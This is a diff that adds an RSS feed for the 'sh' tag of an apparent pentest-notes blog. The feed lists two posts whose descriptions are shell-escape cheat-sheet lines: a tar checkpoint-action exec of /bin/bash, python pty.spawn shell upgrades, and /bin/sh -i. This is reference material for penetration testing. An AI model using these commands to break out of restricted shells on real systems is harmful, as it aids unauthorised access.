@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sh on pentest notes</title>
+    <link>sosprz.github.io/tags/sh/</link>
+    <description>Recent content in Sh on pentest notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>Your language code</language>
+    <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
+    
+	<atom:link href="sosprz.github.io/tags/sh/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Shell</title>
+      <link>sosprz.github.io/post/shell/</link>
+      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
+      
+      <guid>sosprz.github.io/post/shell/</guid>
+      <description> export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python -c import pty; pty.spawn(&#34;/bin/bash&#34;) python3 -c import pty; pty.spawn(&#39;/bin/bash&#39;) echo os.system(&#39;/bin/bash&#39;) /bin/sh -i echo &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;  /tmp/asdf.py python /tmp/asdf.py  </description>
+    </item>
+    
+    <item>
+      <title>Shell escape</title>
+      <link>sosprz.github.io/post/shell-esc/</link>
+      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
+      
+      <guid>sosprz.github.io/post/shell-esc/</guid>
+      <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
+tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash</description>
+    </item>
+    
+  </channel>
+</rss>
